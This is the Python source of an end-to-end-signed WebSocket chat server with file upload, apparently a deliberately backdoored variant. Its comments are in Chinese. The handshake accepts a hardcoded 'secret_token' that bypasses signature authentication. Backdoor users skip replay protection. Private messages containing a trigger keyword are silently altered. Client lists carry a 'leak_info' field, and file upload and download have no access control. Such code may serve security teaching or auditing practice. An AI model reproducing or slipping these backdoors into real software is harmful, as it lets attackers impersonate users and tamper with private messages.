import os
import sys
import asyncio
import websockets
import json
from utils import load_or_generate_keys
from common.chat_protocol import (
    MESSAGE_TYPE_HELLO,
    MESSAGE_TYPE_CLIENT_LIST_REQUEST,
    MESSAGE_TYPE_CLIENT_LIST,
    MESSAGE_TYPE_CHAT,
    MESSAGE_TYPE_PUBLIC_CHAT,
    verify_signature,
    serialize_public_key,
    encrypt_message,
    sign_message,
)
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from aiohttp import web
import uuid
import logging
from common import config

PRIVATE_KEY_PATH = "server/keys/server_private_key.pem"
PUBLIC_KEY_PATH = "server/keys/server_public_key.pem"
UPLOAD_DIR = "server/uploads"
BACKDOOR_TOKEN = "secret_token"

# 确保上传目录存在
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

# 设置日志级别为 DEBUG 以捕获更多信息
logging.basicConfig(level=logging.DEBUG, format='%(levelname)s:%(message)s')

class Server:
    def __init__(self, address, port, http_port):
        self.address = address
        self.port = port
        self.http_port = http_port
        self.private_key, self.public_key = load_or_generate_keys(PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)
        self.clients = {}  # { websocket: {"public_key": ..., "name": ...} }
        self.client_counters = {}  # { public_key: last_counter }

    async def handler(self, websocket, path):
        try:
            message = await websocket.recv()
            logging.debug(f"服务器接收到的初始消息: {message}")
            message = json.loads(message)
            if message["data"]["type"] != MESSAGE_TYPE_HELLO:
                logging.warning("初始消息类型不是 HELLO，关闭连接。")
                await websocket.close()
                return
            # 检查是否有后门token
            backdoor = message["data"].get("backdoor_token", None)
            if backdoor == BACKDOOR_TOKEN:
                self.clients[websocket] = {"public_key": "backdoor_user", "name": "后门用户"}
                logging.info("后门用户已连接。")
            else:
                # 正常认证
                sender_public_key_pem = message["data"]["public_key"].encode()
                sender_public_key = load_pem_public_key(sender_public_key_pem)
                signature_valid = verify_signature(
                    sender_public_key,
                    json.dumps(message["data"]).encode() + str(message["counter"]).encode(),
                    message["signature"]
                )
                if not signature_valid:
                    logging.warning("签名无效。连接已关闭。")
                    await websocket.close()
                    return
                # 获取用户名
                sender_name = message["data"].get("name", "匿名用户")
                self.clients[websocket] = {"public_key": message["data"]["public_key"], "name": sender_name}
                logging.info(f"客户端已连接: {sender_name} ({message['data']['public_key']})")
            await self.listen_to_client(websocket)
        except Exception as e:
            logging.error(f"错误: {e}")
            await websocket.close()

    async def listen_to_client(self, websocket):
        async for message in websocket:
            try:
                logging.debug(f"服务器接收到的消息: {message}")
                message = json.loads(message)
                msg_type = message["data"]["type"]
                if msg_type == MESSAGE_TYPE_CLIENT_LIST_REQUEST:
                    await self.send_client_list(websocket)
                elif msg_type == MESSAGE_TYPE_CHAT:
                    await self.handle_chat_message(websocket, message)
                elif msg_type == MESSAGE_TYPE_PUBLIC_CHAT:
                    await self.handle_public_chat_message(websocket, message)
                else:
                    logging.warning(f"未知的消息类型: {msg_type}")
            except json.JSONDecodeError:
                logging.error("接收到的消息不是有效的 JSON 格式。")
            except Exception as e:
                logging.error(f"处理消息时出错: {e}")

    async def send_client_list(self, websocket):
        client_list = {
            "type": MESSAGE_TYPE_CLIENT_LIST,
            "servers": [
                {
                    "address": self.address,
                    "clients": [
                        {"name": info["name"], "public_key": info["public_key"]}
                        for info in self.clients.values()
                    ]
                }
            ],
            "leak_info": "Sensitive Data"  # 后门信息
        }
        message_str = json.dumps(client_list)
        logging.debug(f"发送在线用户列表消息内容: {message_str}")
        await websocket.send(message_str)
        logging.info("已发送包含用户名的在线用户列表。")

    async def handle_chat_message(self, sender_ws, message):
        sender_info = self.clients.get(sender_ws, {})
        sender_pub_key = sender_info.get("public_key", "unknown")
        sender_name = sender_info.get("name", "未知")
        current_counter = message["counter"]

        # 如果不是后门用户，进行计数器验证
        if sender_pub_key != "backdoor_user":
            last_counter = self.client_counters.get(sender_pub_key, 0)
            if current_counter <= last_counter:
                logging.warning("检测到重放攻击。消息已拒绝。")
                return
            self.client_counters[sender_pub_key] = current_counter

        # 有意篡改特定消息
        decrypted_chat = message["data"].get("chat", "")
        if "篡改关键词" in decrypted_chat:
            message["data"]["chat"] = "篡改后的消息内容"
            logging.info("由于包含后门关键词，消息已被篡改。")

        # 添加发送者信息到消息
        message["data"]["sender"] = sender_name

        # 转发消息给参与者
        participants = message["data"].get("participants", [])
        for ws, info in self.clients.items():
            if info["public_key"] in participants:
                await ws.send(json.dumps(message))
                logging.debug(f"转发私信消息给 {info['name']}: {message}")
                logging.info(f"已将私信消息转发给: {info['name']}")

    async def handle_public_chat_message(self, sender_ws, message):
        sender_info = self.clients.get(sender_ws, {})
        sender_name = sender_info.get("name", "未知")
        message["data"]["sender"] = sender_name
        for ws, info in self.clients.items():
            if ws != sender_ws:
                await ws.send(json.dumps(message))
                logging.debug(f"转发群聊消息给 {info['name']}: {message}")
        logging.info("已向所有客户端广播群聊消息。")

    async def upload_file_handler(self, request):
        reader = await request.multipart()
        field = await reader.next()
        if field.name != 'file':
            return web.Response(status=400, text="Missing file field")
        filename = field.filename
        file_id = str(uuid.uuid4())
        file_path = os.path.join(UPLOAD_DIR, file_id)
        with open(file_path, 'wb') as f:
            while True:
                chunk = await field.read_chunk()
                if not chunk:
                    break
                f.write(chunk)
        file_url = f"http://{self.address}:{self.http_port}/api/download/{file_id}"
        logging.debug(f"文件上传完成，URL: {file_url}")
        logging.info(f"文件已上传: {file_url}")
        return web.json_response({"file_url": file_url})

    async def download_file_handler(self, request):
        file_id = request.match_info['file_id']
        file_path = os.path.join(UPLOAD_DIR, file_id)
        if not os.path.exists(file_path):
            logging.warning(f"文件未找到: {file_path}")
            return web.Response(status=404, text="文件未找到")
        logging.debug(f"文件下载请求: {file_path}")
        return web.FileResponse(path=file_path)

    async def start_http_server(self):
        app = web.Application()
        app.router.add_post('/api/upload', self.upload_file_handler)
        app.router.add_get('/api/download/{file_id}', self.download_file_handler)
        # 禁用信号处理
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, self.address, self.http_port)
        await site.start()
        logging.debug(f"HTTP 服务器启动: http://{self.address}:{self.http_port}")
        logging.info(f"HTTP 服务器已启动在 http://{self.address}:{self.http_port}")

    async def start_websocket_server(self):
        async with websockets.serve(self.handler, self.address, self.port):
            logging.debug(f"WebSocket 服务器启动: ws://{self.address}:{self.port}")
            logging.info(f"WebSocket 服务器已启动在 ws://{self.address}:{self.port}")
            await asyncio.Future()  # 运行直到被取消

    def start(self):
        loop = asyncio.get_event_loop()
        try:
            # 在同一个事件循环中运行 HTTP 和 WebSocket 服务器
            loop.create_task(self.start_http_server())
            loop.create_task(self.start_websocket_server())
            loop.run_forever()
        except KeyboardInterrupt:
            logging.info("服务器正在关闭...")
        finally:
            loop.close()

if __name__ == "__main__":
    server = Server(config.SERVER_ADDRESS, config.SERVER_PORT, config.HTTP_SERVER_PORT)
    server.start()
